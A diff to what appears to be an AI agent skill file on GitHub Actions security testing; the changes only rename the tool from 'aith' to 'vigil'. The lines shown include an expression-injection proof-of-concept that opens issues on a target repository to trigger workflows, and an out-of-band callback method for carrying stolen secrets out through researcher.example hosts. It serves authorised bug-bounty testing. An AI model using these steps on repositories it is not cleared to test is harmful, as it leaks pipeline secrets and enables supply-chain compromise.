@@ -1,12 +1,12 @@
 ---
 name: cicd-security
 description: GitHub Actions and CI/CD pipeline security testing — expression injection, untrusted checkout, artifact/cache poisoning, supply chain, self-hosted runner exploitation, AI agent security
-origin: AI Threat Hunting (adapted from claude-bug-bounty sisakulint integration)
+origin: Vigil (adapted from claude-bug-bounty sisakulint integration)
 ---
 
 # CI/CD Pipeline Security Testing
 
-> **`aith assess kali` audit flags:** use `--technique OTHER` for generic CI/CD abuse. Switch to `CMDI` or `RCE` when the pipeline step accepts attacker-controlled shell input, `AUTH` for token or secret leakage that grants further access, or `INFO-DISCLOSURE` for build-log exposure.
+> **`vigil assess kali` audit flags:** use `--technique OTHER` for generic CI/CD abuse. Switch to `CMDI` or `RCE` when the pipeline step accepts attacker-controlled shell input, `AUTH` for token or secret leakage that grants further access, or `INFO-DISCLOSURE` for build-log exposure.
 
 ## When to Activate
 
@@ -207,12 +207,12 @@ github.head_ref
 
 ## Expression Injection PoC Template
 
-Target-facing PoC actions (creating issues/PRs to trigger vulnerable workflows) must go through `aith assess kali exec` so the action lands in the audit pipeline.
+Target-facing PoC actions (creating issues/PRs to trigger vulnerable workflows) must go through `vigil assess kali exec` so the action lands in the audit pipeline.
 
 ```bash
 # Step 1: Create an issue with injection payload in title
-# This is a target-facing action — run via aith assess kali exec with full audit flags
-aith assess kali exec \
+# This is a target-facing action — run via vigil assess kali exec with full audit flags
+vigil assess kali exec \
   --technique CMDI --intent "expression injection PoC via issue title on TARGET/REPO" \
   --probe-kind exploit --phase consume-test --timeout 60 --destructive \
   -- gh issue create --repo TARGET/REPO \
@@ -221,7 +221,7 @@ aith assess kali exec \
 
 # Step 2: If workflow triggers on issues and interpolates title -> secrets exfiltrated
 #   The title above carries a minted callback host; correlate the hit with
-#   `aith oob poll` per the "OOB Blind Confirmation" section below.
+#   `vigil oob poll` per the "OOB Blind Confirmation" section below.
 # CVSS: 9.3 Critical (RCE with repo secrets)
 ```
 
@@ -233,13 +233,13 @@ confirmation: a nonce-tagged host that fires from the pipeline proves the
 injected step reached the network, and a data-exfil payload surfaces the leaked
 secret as the left label of the callback host.
 
-Confirm readiness with `aith oob status --json`, then **mint a nonce-tagged
+Confirm readiness with `vigil oob status --json`, then **mint a nonce-tagged
 callback** so the hit is self-correlating instead of eyeballed out of the
 listener log:
 
 ```bash
 # Mint one nonce per injection point; record the correlation context.
-aith oob mint --technique cmdi --target-url https://github.com/TARGET/REPO --probe-kind exploit
+vigil oob mint --technique cmdi --target-url https://github.com/TARGET/REPO --probe-kind exploit
 # -> nonce  <prefix>-<token>
 #    http   http://<prefix>-<token>.researcher.example/
 #    dns    <prefix>-<token>.researcher.example
@@ -259,7 +259,7 @@ left label of the callback host):
 Then **poll for the correlated hit** instead of reading the listener log by hand:
 
 ```bash
-aith oob poll --client <name> --json
+vigil oob poll --client <name> --json
 ```
 
 Read the `matched` array: each entry pairs the callback (`protocol`,
@@ -269,7 +269,7 @@ confirmation that the pipeline reached your host — no log grepping. An exfil
 payload surfaces the leaked secret as the left label of the matched callback
 host. If `matched` stays empty after the run triggers, fall back to a benign
 marker in the run log and record a runtime issue noting OOB would have been
-decisive. (`aith oob client logs <name> --lines 80` is a raw listener tail for
+decisive. (`vigil oob client logs <name> --lines 80` is a raw listener tail for
 infra debugging only, not correlation.)
 
 ## Real-World GHSAs (Proven Payouts)
